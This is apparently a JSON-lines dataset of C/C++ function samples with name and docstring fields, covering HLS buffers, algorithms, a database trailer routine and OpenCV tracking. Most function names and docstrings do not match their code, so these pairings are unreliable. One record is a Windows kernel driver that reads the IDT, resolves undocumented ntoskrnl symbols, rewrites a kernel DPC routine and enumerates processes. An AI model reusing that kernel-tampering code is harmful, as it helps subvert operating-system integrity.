{"content":"{'function_name': 'demosaicb_rd0_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> demosaicb_rd1_select(denoise_cache& denoise, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ demosaicb_rd1 read pattern: { demosaicb_update_0[d0, d1] -> denoise[-1 + 2d0, d1] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Read schedule : { demosaicb_update_0[d0, d1] -> [3 + d1, 2 + d0, 4] : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  \/\/ Write schedule: { denoise_update_0[d0, d1] -> [2 + d1, 1 + d0, 3] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ DD fold: { demosaicb_update_0[d0, d1] -> 965 : 0 <= d0 <= 960 and 0 <= d1 <= 1081 }\\n  auto value_denoise_denoise_update_0_write1 = denoise.denoise_denoise_update_0_write1_merged_banks_9.peek_965();\\n  return value_denoise_denoise_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1218}
{"content":"{'function_name': 'RundownRoutine2', 'docstring': '\/\/reinterpret_cast<GCT*>(Apc->NormalContext)->Worker();', 'code': 'EXTERN_C\\nNTSTATUS NTAPI DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)\\n{\\n\\tDbgPrint(\"ep(%p, %wZ)\", DriverObject, RegistryPath);\\n\\t\\n\\tif (!ExIsProcessorFeaturePresent(PF_COMPARE_EXCHANGE128)) return STATUS_NOT_IMPLEMENTED;\\n\\n\\tstruct  \\n\\t{\\n\\t\\tUCHAR pad[6];\\n\\t\\tUSHORT n;\\n\\t\\t_KIDTENTRY64* pidte;\\n\\t} s;\\n\\n\\t__sidt(&s.n);\\n\\n\\ts.pidte += 13;\\n\\n\\tKiGenericProtectionFault.OffsetLow = s.pidte->OffsetLow;\\n\\tKiGenericProtectionFault.OffsetMiddle = s.pidte->OffsetMiddle;\\n\\tKiGenericProtectionFault.OffsetHigh = s.pidte->OffsetHigh;\\n\\n\\tDbgPrint(\"KiGenericProtectionFault = %p\\\\n\", KiGenericProtectionFault.Value);\\n\\n\\tDriverObject->DriverUnload = DriverUnload;\\n\\n\\tNTSTATUS status = InitRegions();\\n\\n\\tDbgPrint(\"InitRegions = %x\\\\n\", status);\\n\\n\\tif (0 <= status)\\n\\t{\\n\\t\\tstatus = TrInit();\\n\\t\\tDbgPrint(\"TrInit = %x\\\\n\", status);\\n\\t}\\n\\n\\tULONG h = 0x9A57BC6B; \/\/ \"ntoskrnl.exe\"\\n\\tLoadNtModule(1, &h);\\n\\n\\tif (CModule* nt = CModule::ByName(\"ntoskrnl.exe\"))\\n\\t{\\n\\t\\tif (PKDPC KiBalanceSetManagerPeriodicDpc = (PKDPC)nt->GetVaFromName(\"KiBalanceSetManagerPeriodicDpc\"))\\n\\t\\t{\\n\\t\\t\\tDbgPrint(\"KiBalanceSetManagerPeriodicDpc=%p(%p(%p))\", \\n\\t\\t\\t\\tKiBalanceSetManagerPeriodicDpc, KiBalanceSetManagerPeriodicDpc->DeferredRoutine,\\n\\t\\t\\t\\tKiBalanceSetManagerPeriodicDpc->DeferredContext);\\n\\n\\t\\t\\tif (PKDEFERRED_ROUTINE KiBalanceSetManagerDeferredRoutine = (PKDEFERRED_ROUTINE)nt->GetVaFromName(\"KiBalanceSetManagerDeferredRoutine\"))\\n\\t\\t\\t{\\n\\t\\t\\t\\tif (PVOID KiBalanceSetManagerPeriodicEvent = (PKDEFERRED_ROUTINE)nt->GetVaFromName(\"KiBalanceSetManagerPeriodicEvent\"))\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tDbgPrint(\"%p**%p\\\\n\", KiBalanceSetManagerDeferredRoutine, KiBalanceSetManagerPeriodicEvent);\\n\\n\\t\\t\\t\\t\\tKiBalanceSetManagerPeriodicDpc->DeferredRoutine = KiBalanceSetManagerDeferredRoutine;\\n\\t\\t\\t\\t\\t\/\/ raise!\\n\\t\\t\\t\\t\\tKiBalanceSetManagerPeriodicDpc->DeferredContext = KiBalanceSetManagerPeriodicEvent;\\n\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tif ((__imp_PsEnumProcesses = nt->GetVaFromName(\"PsEnumProcesses\")) &&\\n\\t\\t\\t(__imp_PsEnumProcessThreads = nt->GetVaFromName(\"PsEnumProcessThreads\")))\\n\\t\\t{\\n\\t\\t\\tGCT ctx;\\n\\t\\t\\tPsEnumProcesses(ProcessCB, &ctx);\\n\\t\\t\\tctx.Main();\\n\\t\\t}\\n\\n\\t\\tif (__imp_KiDispatchCallout = nt->GetVaFromName(\"KiDispatchCallout\"))\\n\\t\\t{\\n\\t\\t\\t\/\/TrHook(&KiDisp, 1);\\n\\t\\t}\\n\\t}\\n\\n\\t\/\/HookGenericFault({ MyGenericProtectionFault });\\n\\n\\tif (0 <= status)\\n\\t{\\n\\t\\t\/\/TrHook(yy, _countof(yy));\\n\\t}\\n\\n\\t\/\/IO_SESSION_STATE_NOTIFICATION ssn = { sizeof(ssn), 0, DriverObject, IO_SESSION_STATE_ALL_EVENTS, };\\n\\t\/\/status = IoRegisterContainerNotification(IoSessionStateNotification, \\n\\t\/\/\\t(PIO_CONTAINER_NOTIFICATION_FUNCTION)OnSessionNotify, &ssn, sizeof(ssn), &gCallbackRegistration);\\n\\n\\n\\t\/\/if (__imp_ExIsSafeWorkItem = CModule::GetVaFromName(\"ntoskrnl.exe\", \"ExIsSafeWorkItem\"))\\n\\t\/\/{\\n\\t\/\/\\tDbgPrint(\"ExIsSafeWorkItem = %p\\\\n\", __imp_ExIsSafeWorkItem);\\n\\n\\t\/\/\\tPVOID pv = testSafeWorkItem();;\\n\\t\/\/\\tDbgPrint(\"SafeWorkItem = %p\\\\n\", pv);\\n\\t\/\/}\\n\\n\\t\/\/PVOID pv = CModule::GetVaFromName(\"ntoskrnl.exe\", \"MmGetSessionById\");\\n\\t\/\/DbgPrint(\"===%p\\\\n\", pv);\\n\\t\/\/EnumSysThreads();\\n\\treturn STATUS_SUCCESS;\\n}'}","id":1224}
{"content":"{'function_name': 'denoiseb_rd34_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd35_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd35 read pattern: { denoiseb_update_0[d0, d1] -> raw[1 + 2d0, -2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 3861 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write1 = raw.raw_raw_update_0_write1_merged_banks_25.peek_3861();\\n  return value_raw_raw_update_0_write1;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":1231}
{"content":"{'function_name': 'onWsEvent', 'docstring': '\/\/ When a WebSocket message is received', 'code': 'String formatBytes(size_t bytes) { \/\/ convert sizes in bytes to KB and MB\\n  String val;\\n  if (bytes < 1024) {\\n    val= String(bytes) + \"B\";\\n  } else if (bytes < (1024 * 1024)) {\\n    val= String(bytes \/ 1024.0) + \"KB\";\\n  } else if (bytes < (1024 * 1024 * 1024)) {\\n    val= String(bytes \/ 1024.0 \/ 1024.0) + \"MB\";\\n  }\\n\\n  return val;\\n}'}","id":1245}
{"content":"{'function_name': 'isSorted', 'docstring': '\/\/Recursive case', 'code': 'bool isSorted_end(int *arr,int n)\\n{\\n    \/\/base case -\\n    if(n==1)\\n        return true;\\n    bool ans = isSorted_end(arr+1,n-1);\\n    if(arr[0]<arr[1]&&ans)\\n        return true;\\n    return false;\\n}'}","id":1246}
{"content":"{'function_name': 'Handler', 'docstring': '\/\/ terminator | func_expr | var\\r', 'code': 'bool Handler(const Food& food, void* ctx, std::string&) noexcept override\\r\\n        { \/\/ operand | struct_with_bracket \\r\\n            switch (food.BranchID())\\r\\n            {\\r\\n            case 0:\\r\\n                Ctx(ctx)->m_stackStructExpr.push_back(Ctx(ctx)->m_stackOperand.back());\\r\\n                Ctx(ctx)->m_stackOperand.pop_back();\\r\\n                return true;\\r\\n            case 1:\\r\\n                Ctx(ctx)->m_stackStructExpr.push_back(Ctx(ctx)->m_stackExpr.back());\\r\\n                Ctx(ctx)->m_stackExpr.pop_back();\\r\\n                return true;\\r\\n            default:\\n                return false;\\r\\n            }\\r\\n        }'}","id":1251}
{"content":"{'function_name': 'mexTryToCallFunctions', 'docstring': '\/\/ no functions to try, so return failure', 'code': 'bool mexTryToCallFunctions(int nlhs, mxArray *plhs[], int nrhs,\\n                           const mxArray *prhs[], bool throw_on_error,\\n                           Func0 function0, Funcs... functions) {\\n  bool success = mexCallFunction(nlhs, plhs, nrhs, prhs, false,\\n                                 function0);  \/\/ try the first one\\n  if (!success) {  \/\/ recurse to try the other options\\n    success = mexTryToCallFunctions(nlhs, plhs, nrhs, prhs, false,\\n                                    functions...);  \/\/ don\\'t throw immediately,\\n                                                    \/\/ wait until all options\\n                                                    \/\/ exhausted\\n    if (throw_on_error && !success) {\\n      std::ostringstream log;\\n      log << \"mexTryToCallFunctions: failed to find a function to call after \"\\n             \"trying \" << sizeof...(Funcs) + 1 << \" options. Errors:\";\\n      collectMexTryCallFunctionsErrorDiagnostics(nrhs, prhs, log, 1, function0,\\n                                                 functions...);\\n      throw std::runtime_error(log.str());\\n    }\\n  }\\n  return success;\\n}'}","id":1255}
{"content":"{'function_name': 'minCoins', 'docstring': '\/\/ Try every coin that has smaller value than V\\r', 'code': 'int count(int coins[],int m,int V)\\r\\n{\\t\/\/ table[i] will be storing the minimum number of coins\\r\\n    \/\/ required for i value.  So table[V] will have result\\r\\n    int table[V+1];\\r\\n    \/\/ Base case (If given value V is 0)\\r\\n    table[0] = 0;\\r\\n    \/\/ Initialize all table values as Infinite\\r\\n    for (int i=1; i<=V; i++)\\r\\n        table[i] = INT_MAX;\\r\\n    \/\/ Compute minimum coins required for all\\r\\n    \/\/ values from 1 to V\\r\\n    for (int i=1; i<=V; i++)\\r\\n    {\\r\\n        \/\/ Go through all coins smaller than i\\r\\n        for (int j=0; j<m; j++)\\r\\n          if (coins[j] <= i)\\r\\n          {\\r\\n              int sub_res = table[i-coins[j]];\\r\\n              if (sub_res != INT_MAX && sub_res + 1 < table[i])\\r\\n                  table[i] = sub_res + 1;\\r\\n          }\\r\\n    }\\r\\n    if(table[V]==INT_MAX)\\r\\n        return -1;\\r\\n    return table[V];\\r\\n}'}","id":1268}
{"content":"{'function_name': 'generateOrderNum', 'docstring': '\/\/orderSummary << generateOrderNum();', 'code': 'int main(){\\n    \\n    ofstream orderSummary;\\n    orderSummary.open(\"orderSummary.dat\"); \/\/ everyones code should be below this\\n    \\n    orderSummary <<\"Order Number: \" << generateOrderNum()<<endl;\\n    \\n    int iNum, iQTY,count = 0, iNumChoice, j, itmcount;\\n    double iPrice,total=0;\\n    string iDescrip, holder1;\\n    ifstream invFile(\"inventory.dat\");\\n    \\n    while (getline(invFile, holder1)) { \/\/creates a count of items to create pointer array\\n        count++;\\n    }\\n    \\n    invFile.close();\\n    invFile.clear();\\n    invFile.open(\"inventory.dat\");\\n    \\n    Product *productInfo = new Product[count];  \\n    \\n    j=0;\\n    itmcount = 1;\\n    while(getline(invFile,holder1)){ \/\/pulls string from file\\n        stringstream hold(holder1); \/\/turns string into stream to allow parse\\n    while(getline(hold,holder1,\\',\\')){ \/\/parses stringstream\\n        \\n        if (itmcount==4){\\n            iQTY=atoi(holder1.c_str());\\n            (*(productInfo+j)).setStockQuantity(iQTY);\\n            itmcount = 1;\\n            j++;\\n        }\\n        \\n        else if (itmcount==3){\\n            iPrice=atof(holder1.c_str());\\n            (*(productInfo+j)).setPrice(iPrice);\\n            itmcount = 4;\\n        }\\n        \\n        else if (itmcount==2){\\n            iDescrip=holder1;\\n            (*(productInfo+j)).setDescription(iDescrip);\\n            itmcount = 3;\\n        }\\n        \\n        else if (itmcount==1){\\n            iNum=atoi(holder1.c_str());\\n            (*(productInfo+j)).setItemNo(iNum);\\n            itmcount = 2;\\n        }\\n       \\n    }\\n    }\\n        \\n    bool choice1=false, choice2=false, error1=false; \/\/ choice 1 and 2 are used for loop traps while error1 is used for validation of Product ID\\n    int purchaseQTY[count];\\n    \\n    for(int i=0; i<count; i++){ \/\/ displays all items and details\\n        (*(productInfo+i)).printSummary();\\n    }\\n    \\n    \\n    while (choice1==false){ \/\/ item selection and quantity selection, loops user inputs 0\\n        cout << \"Please select the item(s) the customer wishes to purchase (Enter Item # shown above. Enter 0 when finished with this step)\" << endl;\\n        cin >> iNumChoice;\\n        int i=0;\\n        while (i<count){\\n            if(iNumChoice==(*(productInfo+i)).getItemNo()){\\n                bool flag=true;\\n                (*(productInfo+i)).setBool(flag);\\n                cout << \"Please Enter Purchase Quantity Amount: \";\\n                cin >> purchaseQTY[i];\\n                int q=(*(productInfo+i)).getStockQuantity();\\n                while((q<purchaseQTY[i])||(purchaseQTY[i]<0)){\/\/validation for quantity\\n                    cout<< \"Invalid Quantity.\" << endl << \"Please Enter Purchase Quantity Amount: \";\\n                cin >> purchaseQTY[i];\\n                error1=true;\\n                }\\n                total+= (purchaseQTY[i]*(*(productInfo+i)).getPrice());\\n                \\n            }\\n            else if (iNumChoice==0){\\n                choice1=true;\\n                error1=true;\\n            }\\n            i++;\\n        }\\n        if (error1==false){\\n            cout <<\"Invalid Product ID\" << endl;\\n        }\\n        \\n    }\\n    \\n    invFile.close();\\n    invFile.clear(); \/\/closes and clears input file;\\n    \\n    while(choice2==false){ \/\/creates output for final order summary\\n        int i=0;\\n        while(i<count){\\n            int num, q;\\n            string desc;\\n            double p, pTotal;\\n            if((*(productInfo+i)).getBool()==true){\\n                num=(*(productInfo+i)).getItemNo();\\n                desc=(*(productInfo+i)).getDescription();\\n                p=(*(productInfo+i)).getPrice();\\n                q=(*(productInfo+i)).getStockQuantity();\\n                pTotal=purchaseQTY[i]*p;\\n                orderSummary<< num << \"|\" << desc <<\"|\"<<purchaseQTY[i]<<\"|$\"<< pTotal<<endl; \/\/ needs setprecision[2]\\n                }\\n            i++;\\n        }\\n        choice2=true; \\n    }\\n    \\n    orderSummary << \"$\" << total << endl; \/\/ prints total\\n    \\n    \\n\\t\\n\\treturn 0;\\n}'}","id":1276}
{"content":"{'function_name': 'nodeCmp', 'docstring': '\/\/ l<r', 'code': 'void getCodes(Node* node, map<byte,int> & codes, int code){    \/\/ ***********************\\n  if(node->left == nullptr){\\n    int result = 1;\\n    while(code != 1){\\n      result <<= 1;\\n      result |= code & 1;\\n      code >>= 1;\\n    }\\n    codes[node->value] = result;\\n    return;\\n  }\\n\\n  getCodes(node->left, codes, code << 1);\\n  getCodes(node->right, codes, (code << 1) + 1);\\n}'}","id":1281}
{"content":"{'function_name': 'incrementBelt', 'docstring': '\/\/ Increase num of candy type on belt\\r', 'code': \"ProductType decrementBelt(CONSUMER_DATA * consumerPtr) {\\r\\n    \\r\\n    SHARED_DATA* sharedData = consumerPtr->sharedPtr;\\r\\n\\t\\r\\n\\t\/\/ Type of candy about to be consumed\\r\\n    ProductType candyType = (ProductType) sharedData->candiesOnBelt[sharedData->indexOfCandyConsumedOnBelt];\\r\\n\\t\\r\\n    \/\/ Remove candy on belt and move pointer\\r\\n\\tsharedData->indexOfCandyConsumedOnBelt = ((sharedData->indexOfCandyConsumedOnBelt + 1) % CONVEYER_BELT_MAX); \/\/ Remainder of belt max of 10 to ensure consumers aren't consuming candies past max of belt\\r\\n\\t\\r\\n\\t\/\/ Increase total num of candies consumed\\r\\n\\tsharedData->totalConsumed++;\\r\\n\\t\\r\\n    \/\/ Increase num of candy type consumed by the consumer Lucy or Ethel\\r\\n\\tconsumerPtr->numOfCandyTypeConsumed[candyType]++;\\r\\n\\t\\r\\n\\t\/\/ Decrease num of candy type on belt\\r\\n    sharedData->numOfCandyTypeOnBelt[candyType]--;\\r\\n\\r\\n    return candyType;\\r\\n  \\r\\n}\"}","id":1282}
{"content":"{'function_name': 'ErrDBReadDBTrailer', 'docstring': '\/\/ there should be at least one page past the database header for us to read', 'code': 'ERR ErrDBTryToZeroDBTrailer(\\n    const INST * const pinst,\\n    IFileSystemAPI * const pfsapi,\\n    const WCHAR * const wszDatabase)\\n\/\/  ================================================================\\n\/\/\\n\/\/ Zeroes the last page of the database if the last page is actually a trailer.\\n\/\/\\n\/\/-\\n{\\n    Assert( pfsapi );\\n    Assert( wszDatabase );\\n    \\n    ERR         err     = JET_errSuccess;\\n    IFileAPI *  pfapi   = NULL;\\n    QWORD       cbSize  = 0;\\n\\n    BYTE *      pbTrailer = NULL;;\\n    TraceContextScope tcScope( iorpHeader );\\n    tcScope->SetDwEngineObjid( objidSystemRoot );\\n\\n    Alloc( pbTrailer = static_cast<BYTE *> ( PvOSMemoryPageAlloc( g_cbPage, NULL ) ) );\\n\\n    \/\/ Check the trailer page to see if it really is a trailer page.\\n    err = ErrDBReadAndCheckDBTrailer( pinst, pfsapi, wszDatabase, pbTrailer, g_cbPage );\\n    if( err < JET_errSuccess )\\n    {\\n        \\n        \/\/ If something goes wrong here, it\\'s ok because the zero\\'ing is just to suppress\\n        \/\/ unexpected checksum failures.\\n        \\n        err = JET_errSuccess;\\n        goto HandleError;\\n    }\\n\\n    Call( pfsapi->ErrFileOpen(\\n            wszDatabase,\\n            BoolParam( JET_paramEnableFileCache ) ? IFileAPI::fmfCached : IFileAPI::fmfNone,\\n            &pfapi ) );\\n            \\n    Call( pfapi->ErrSize( &cbSize, IFileAPI::filesizeLogical ) );\\n\\n    \/\/ there should be at least one page past the database header for us to read\\n    if( cbSize < QWORD ( cpgDBReserved + 1 )  * g_cbPage )\\n    {\\n        OSUHAEmitFailureTag( pinst, HaDbFailureTagCorruption, L\"e893b103-65f9-4833-9065-f484904fe609\" );\\n        Error( ErrERRCheck( JET_errDatabaseCorrupted ) );\\n    }\\n\\n    \/\/ Zero the page\\n    memset( pbTrailer, 0, g_cbPage );\\n\\n    Call( pfapi->ErrIOWrite( *tcScope, cbSize - QWORD(g_cbPage), g_cbPage, pbTrailer, qosIONormal ) );\\n    CallS( err );\\n\\n    \/\/  Ugh, no pinst!  Ugh ... skipping FFB suppression for now, but not that bad \\n    \/\/  for this one time JetInit after backup restore.\\n    Call( ErrUtilFlushFileBuffers( pfapi, iofrUtility ) );\\n    \\nHandleError:\\n    OSMemoryPageFree( pbTrailer );\\n    delete pfapi;\\n    return err;\\n}'}","id":1283}
{"content":"{'function_name': 'display', 'docstring': '\/\/ no need to take temp as head is pass by value', 'code': 'int main()\\n{\\n    node* head = NULL;\\n    head = insertAtEnd(head,10);\\n    head = insertAtEnd(head,20);\\n    head = insertAtEnd(head,30);\\n    display(head);\\n\\n    \/\/ node* newhead  = reverseDLL(head);\\n    \/\/ display(newhead);\\n    \/\/ head = deleteAtHead(head);\\n    \/\/ head = deleteAtEnd(head);\\n    \/\/ display(head);\\n\\n    return 0;\\n}'}","id":1289}
{"content":"{'function_name': 'NeuroSimNeuronInitialize', 'docstring': \"\/\/ Only need the MSB of adder output to determine it is positive or negative in 2's complement\", 'code': \"double NeuroSimNeuronReadLatency(SubArray *subArray, Adder& adder, Mux& mux, RowDecoder& muxDecoder, DFF& dff, Subtractor& subtractor) {\\t\/\/ For 1 weighted sum task on selected columns\\n\\tif (!param->NeuroSimDynamicPerformance) { return 0; }\\t\/\/ Skip this function if param->NeuroSimDynamicPerformance is false\\n\\tif (subArray->numColMuxed > 1) \\n    {\\n\\t\\tadder.CalculateLatency(1e20, mux.capTgDrain, 1);\\n\\t\\tmux.CalculateLatency(adder.rampOutput, dff.capTgDrain, 1);\\n\\t\\tmuxDecoder.CalculateLatency(1e20, mux.capTgGateN * adder.numAdder, mux.capTgGateP * adder.numAdder, 1, 1);\\t\/\/ Don't care write\\n\\t\\tsubtractor.CalculateLatency(1e20, mux.capTgDrain, 1);\\n\\t} \\n    else \\n    {\\t\/\/ No need for Mux and Mux decoder\\n\\t\\tadder.CalculateLatency(1e20, dff.capTgDrain, 1);\\n\\t\\tsubtractor.CalculateLatency(1e20, dff.capTgDrain, 1);\\n\\t}\\n\\tdff.CalculateLatency(1e20, 1);\\n    if (subArray-> parallelRead== true)\\n    {\\n       return mux.readLatency + subtractor.readLatency;     \\n    }\\n    else\\n    {\\n\\t    return adder.readLatency + mux.readLatency + dff.readLatency + subtractor.readLatency;\\n    }\\n}\"}","id":1296}
{"content":"{'function_name': 'uint32_cntlnz', 'docstring': '\/\/ COMPILER_', 'code': 'inline uint32_t uint32_cnttz(uint32_t _val)\\n\\t{\\n#if COMPILER_GCC || COMPILER_CLANG\\n\\t\\treturn __builtin_ctz(_val);\\n#elif COMPILER_MSVC && PLATFORM_WINDOWS\\n\\t\\tunsigned long index;\\n\\t\\t_BitScanForward(&index, _val);\\n\\t\\treturn index;\\n#else\\n\\t\\treturn uint32_cnttz_ref(_val);\\n#endif \/\/ COMPILER_\\n\\t}'}","id":1300}
{"content":"{'function_name': 'MergeInternal', 'docstring': '\/\/ BlockSwap', 'code': \"auto MergeInPlace(RandomAccessIterator first, RandomAccessIterator middle, RandomAccessIterator last,\\n                          Compare compare, Projection projection)\\n            -> void\\n        {\\n            if (first == middle || middle == last) return;\\n\\n            \/*\\n             this just repeatedly binary searches into B and rotates A into position.\\n             the paper suggests using the 'rotation-based Hwang and Lin algorithm' here,\\n             but I decided to stick with this because it had better situational performance\\n\\n             (Hwang and Lin is designed for merging subarrays of very different sizes,\\n             but WikiSort almost always uses subarrays that are roughly the same size)\\n\\n             normally this is incredibly suboptimal, but this function is only called\\n             when none of the A or B blocks in any subarray contained 2\u221aA unique values,\\n             which places a hard limit on the number of times this will ACTUALLY need\\n             to binary search and rotate.\\n\\n             according to my analysis the worst case is \u221aA rotations performed on \u221aA items\\n             once the constant factors are removed, which ends up being O(n)\\n\\n             again, this is NOT a general-purpose solution \u2013 it only works well in this case!\\n             kind of like how the O(n^2) insertion sort is used in some places\\n             *\/\\n            auto&& proj = utility::as_function(projection);\\n\\n            while (true) {\\n                \/\/ find the first place in B where the first item in A needs to be inserted\\n                RandomAccessIterator mid2 = lower_bound(middle, last, proj(*first), compare, projection);\\n\\n                \/\/ rotate A into place\\n                auto amount = std::distance(middle, mid2);\\n                detail::rotate(first, middle, mid2);\\n                if (last == mid2) break;\\n\\n                \/\/ calculate the new A and B ranges\\n                middle = mid2;\\n                first += amount;\\n                first = upper_bound(first, middle, proj(*first), compare, projection);\\n                if (first == middle) break;\\n            }\\n        }\"}","id":1301}
{"content":"{'function_name': 'output_mesh_info2', 'docstring': '\/*************  MAKE AN OUTPUT FOR THE INTERFACE *************\/', 'code': 'point<T, 2>\\nfind_zero_crossing_on_face(const point<T,2>& p0, const point<T,2>& p1, const Function& level_set_function,\\n                   const T& threshold, const Mesh & msh, const typename Mesh::face_type& fc)\\n{\\n    \/* !!! We assume that the level set function *has* a zero crossing\\n     * between p0 and p1 !!! *\/\\n    \\n    \/\/ I SHOULD CHECK THAT pm IS ALWAYS ON THE FACE p0-p1 ???????\\n    auto pa = p0;\\n    auto pb = p1;\\n    auto pm = (pa+pb)\/2.0;\\n    auto pm_prev = pm;\\n\\n    T x_diff_sq, y_diff_sq;\\n\\n    \/* A threshold of 1\/10000 the diameter of the element is considered\\n     * acceptable. Since with 24 iterations we reduce the error by 16384\\n     * and the worst case is that the two points are at the opposite sides\\n     * of the element, we put 30 as limit. *\/\\n    size_t max_iter = 50;\\n\\n    do {\\n        auto la = level_set_function(pa,msh,fc);\\n        auto lb = level_set_function(pb,msh,fc);\\n        auto lm = level_set_function(pm,msh,fc);\\n\\n        if ( (lb >= 0 && lm >= 0) || (lb < 0 && lm < 0) )\\n        {   \/* intersection is between pa and pm *\/\\n            pm_prev = pm;\\n            pb = pm;\\n            pm = (pa+pb)\/2.0;\\n        }\\n        else\\n        {   \/* intersection is between pm and pb *\/\\n            pm_prev = pm;\\n            pa = pm;\\n            pm = (pa+pb)\/2.0;\\n        }\\n\\n        x_diff_sq = (pm_prev.x() - pm.x()) * (pm_prev.x() - pm.x());\\n        y_diff_sq = (pm_prev.y() - pm.y()) * (pm_prev.y() - pm.y());\\n\\n    } while ( (sqrt(x_diff_sq + y_diff_sq) > threshold) && max_iter-- );\\n\\n    return pm;\\n\\n    \/* Affine zero crossing was like that: *\/\\n    \/\/auto t = l0\/(l0-l1);\\n    \/\/auto ip = (pts[1] - pts[0]) * t + pts[0];\\n}'}","id":1302}
{"content":"{'function_name': 'AddCutPathToAllPath', 'docstring': '\/\/ \u7136\u540e\u4f9d\u6b21\u8fde\u63a5\u8def\u5f84', 'code': 'BOOL GetAllPathEndPoint ( CSmtCPathLib &AllPath, PNT3D end )\\n{\\n\\t\/\/ \u5982\u679c\u6ca1\u6709\u8def\u5f84\u8fd4\u56deFALSE\\n\\tif( AllPath.m_cAllPath.GetCount () < 1 )\\n\\t\\treturn FALSE ;\\n\\n\\tCSmtCutPath *pPath = AllPath.m_cAllPath.GetTail () ;\\n\\tGetSmtPathEndPnt( pPath, 1, end ) ;\\n\\treturn TRUE ;\\n}'}","id":1304}
{"content":"{'function_name': 'TopPlayerRectEstimation', 'docstring': '\/\/ Check the size of the bounding box', 'code': 'cv::Rect BottomPlayerRectEstimation(cv::Mat frame, cv::Ptr<cv::BackgroundSubtractor> gmm) {\\n\\t\\tcvtColor(frame, frame, CV_BGR2GRAY);\\n\\n\\t\\tcv::Mat bpimage = frame.clone();\\n\\n\\t\\t\/\/ >>>>> Noise smoothing\\n\\t\\tcv::GaussianBlur(frame, bpimage, cv::Size(3, 3), 3.0, 3.0);\\n\\t\\t\/\/ <<<<< Noise smoothing\\n\\n\\t\\tbpimage = BottomPlayerFrame(bpimage);\\n\\n\\n\\t\\t\/\/ Background Subtraction\\n\\t\\tcv::Mat fgMaskGMM;\\n\\t\\tgmm->apply(bpimage, fgMaskGMM);\\n\\n\\t\\tcv::Mat skinimage;\\n\\t\\tcv::Mat element = cv::getStructuringElement(cv::MORPH_RECT, cv::Size(3, 3));\\n\\t\\tcv::dilate(fgMaskGMM, skinimage, element, cv::Point(-1, -1), 2, 1, 1);\\n\\t\\tcv::erode(skinimage, skinimage, element, cv::Point(-1, -1), 2, 1, 1);\\n\\n\\t\\t\/\/ Find contours\\n\\t\\tcv::Mat contourimage;\\n\\t\\tcontourimage = skinimage.clone();\\n\\t\\tstd::vector<std::vector<cv::Point>> contours;\\n\\t\\tstd::vector<cv::Vec4i> bpimage_hierarchy;\\n\\t\\tfindContours(contourimage, contours, bpimage_hierarchy, CV_RETR_EXTERNAL, CV_CHAIN_APPROX_SIMPLE, cv::Point(0, 0));\\n\\n\\t\\tcv::Rect bp_bounding_rect, bp_bounding_rect2(0, 0, 0, 0);\\n\\n\\t\\t\/\/ Iterate through each contour\\n\\t\\tfor (size_t i = 0; i < contours.size(); i++) {\\n\\t\\t\\t\/\/  Find the area of contour\\n\\t\\t\\tbp_bounding_rect = boundingRect(contours[i]);\\n\\t\\t\\tif (bp_bounding_rect.y > bp_bounding_rect2.y && bp_bounding_rect.width > 15 && bp_bounding_rect.height > 15) {\\n\\t\\t\\t\\tbp_bounding_rect2 = bp_bounding_rect;\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tcv::Scalar color(255, 255, 255);\\n\\n\\t\\t\/\/ Check the size of the bounding box\\n\\t\\tif (bp_bounding_rect2.width < 70 && bp_bounding_rect2.height < 126) {\\n\\t\\t\\tbp_bounding_rect2 = NormalizeBottomROI(frame, bp_bounding_rect2);\\n\\t\\t}\\n\\n\\t\\t\/\/ Draw the largest contour using previously stored index\\n\\t\\tcv::rectangle(frame, bp_bounding_rect2, color, 1, 8, 0);\\n\\n\\t\\treturn bp_bounding_rect2;\\n\\t}'}","id":1308}
